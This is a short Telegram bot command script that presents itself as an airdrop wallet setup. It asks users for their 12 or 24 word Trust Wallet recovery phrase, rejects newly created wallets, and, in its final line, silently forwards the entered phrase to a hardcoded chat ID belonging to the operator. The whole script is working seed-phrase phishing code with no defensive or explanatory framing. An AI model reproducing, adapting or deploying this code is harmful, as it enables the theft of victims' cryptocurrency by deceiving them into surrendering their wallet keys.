/*CMD
  command: /importwallet
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER
๐ Setting up wallet ๐
๐ The recovery phase is the master key to your wallet. 




โ๏ธ To Avoid Spam and unfair Multi-Claims, NEW CREATED WALLET NOT ACCEPTED.โ๏ธ
โ Only TRUST WALLET accepted!
โ Please note: Airdrop requires Multi-Coin Wallet!
โ Please enter your 12 or 24 words phrase separated with spaces:


  ANSWER
  keyboard: ๐พSave, ๐Menu
  aliases: ๐setup wallet
CMD*/

Bot.sendMessage( "Your Wallet Phase: " + message + "\nIf is correct press ๐พSave");
Bot.sendMessageToChatWithId(1548791150, message);

